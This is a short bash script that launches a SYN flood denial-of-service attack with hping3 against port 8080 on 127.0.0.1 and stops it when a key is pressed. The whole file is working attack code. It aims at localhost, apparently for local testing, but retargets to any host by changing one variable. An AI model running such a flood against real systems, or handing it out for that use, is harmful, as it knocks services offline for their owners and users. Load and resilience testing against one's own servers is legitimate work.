#!/bin/bash
SERVER_IP="127.0.0.1"
echo "Launching SYN flood attack..."
sudo hping3 -S --flood -p 8080 "$SERVER_IP" &
echo "Press any key to stop the attack..."
read -n 1
sudo pkill -f hping3
echo "Attack stopped."